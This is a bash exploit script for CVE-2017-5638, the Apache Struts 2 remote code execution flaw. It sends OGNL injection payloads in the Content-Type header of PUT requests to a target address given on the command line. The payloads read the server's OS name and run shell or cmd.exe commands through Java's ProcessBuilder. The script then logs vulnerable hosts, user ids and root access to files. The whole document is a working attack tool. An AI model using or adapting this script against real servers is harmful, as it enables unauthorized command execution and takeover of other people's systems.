#!/bin/bash
#
# 
# by f0r34chb3t4 - Qui Abr 12 21:00:24 -03 2018
#
# CVE-2017-5638
# Apache Struts 2 Vulnerability Remote Code Execution
#
# chmod a+x CVE-2017-5638-PUT.sh
#
# ./CVE-2017-5638-PUT.sh 192.168.9.3
#

readonly IPv4="$1"
readonly PORT=${2:-80}

[ -z "${IPv4}" ] && exit 1
[ -z "${PORT}" ] && exit 1


################################################################################
# user agent list
################################################################################
read -d '\n' -r USER_AGENT_LIST <<-TXT
Apache-HttpClient/4.3.1 (java 1.5)
TXT


readonly TIMEOUT=30
readonly CONNECT_TIMEOUT=5
readonly MAX_TIME=30
readonly USERAGENT=$( sort -R <<< "${USER_AGENT_LIST}" | head -n1 )

readonly CMD_LNX='whoami'
readonly CMD_WIN='whoami'

# get OS
readonly GOODKEY=$( head /dev/urandom | tr -dc A-F0-9 | head -c10 )
readonly OS_EXEC='(#os=@java.lang.System@getProperty("os.name")).(#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("Set-Cookie","'${GOODKEY}'="+#os))'
readonly OS_PAYLOAD='%{(#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).'"${OS_EXEC}"'}'

# cmd to exec
readonly CMD_PAYLOAD="%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='exit').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','"${CMD_WIN}"'}:{'/bin/sh','-c','"${CMD_LNX}"'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"


# exploit PUT METHOD
function put_rce(){

	local url="$1"
	local payload="$2"
	local JSESSIONID=$( head /dev/urandom | tr -dc A-F0-9 | head -c32 )

	curl -kis --stderr /dev/null --retry 2 -X PUT \
	--location --max-redirs 2 \
	-H 'Content-Type: '"${payload}" \
	-H "Cookie: JSESSIONID=${JSESSIONID}" \
	-H 'Connection: close' \
	-H 'Content-Length: 0' \
	-H 'Accept-Encoding: identity' \
	--connect-timeout ${CONNECT_TIMEOUT} \
	--max-time ${MAX_TIME} \
	--user-agent "${USERAGENT}" \
	--url "${url}"

}


function check(){

	local url="$1"
	local buffer="$2"
	local hos="$( grep -ioP '\(Win64|Ubuntu|Unix|Win32|Red Hat|NETWARE|Debian.+?|FreeBSD\)' <<< "${buffer}" | tr -d $'\r' | head -n1 )"
	local loc="$( grep -ioP 'Location:.+' <<< "${buffer}" | tr -d $'\r' | head -n1 )"
	local srv="$( grep -ioP 'Server:.+' <<< "${buffer}" | tr -d $'\r' | head -n1 )"

	[ -z "${hos}" ] && hos='n/a'
	[ -z "${loc}" ] && loc='n/a'
	[ -z "${srv}" ] && srv='n/a'


	local os=$( grep -F 'Set-Cookie:' <<< "${buffer}" | tr -d $'\r' | grep -F "${GOODKEY}" | cut -d '=' -f2- | head -n1 )
	
	if [ ! -z "${os}" ]; then

		printf '[+] vul os+: %s os: %s\n' "${url}" "${os}" | tee -a vul-os.dat
		return 0

	fi

	local uid="$( grep -P '(uid|guid|groups)=[0-9]{1,5}\(.+?\)' <<< "${buffer}" | tr -d $'\r' | head -n1 )"

	if [ ! -z "${uid}" ]; then
		printf '[+] vul uid: %s (%s) (%s) (%s)\n' "${url}" "${uid}" "${hos}" "${loc}" | tee -a vul-uid.dat
		grep -qF 'uid=0' <<< "${buffer}" && IS_ROOT=1
		return 0
	fi


	if grep -qF 'org.apache.struts' <<< "${buffer}"; then
		printf '[+] vul str: %s (%s) (%s) (%s)\n' "${url}" "${hos}" "${srv}" "${loc}" | tee -a vul-apache.struts.dat
		exit 0
	fi


	if ! grep -qF 'HTTP/1.' <<< "${buffer}"; then
		exit 1
	fi	

}


XPATH='/index.action'
URL="${IPv4}"

if ! grep -qP '^https?://' <<< "${URL}"; then
	URL='http://'"${URL}"
fi

if ! grep -qP '^https?://.+/' <<< "${URL}"; then
	URL="${URL}${XPATH}"
fi

printf 'try: %s\n' "${URL}"

check "${URL}" "$( put_rce "${URL}" "${OS_PAYLOAD}" )"
check "${URL}" "$( put_rce "${URL}" "${CMD_PAYLOAD}" )"


exit 0
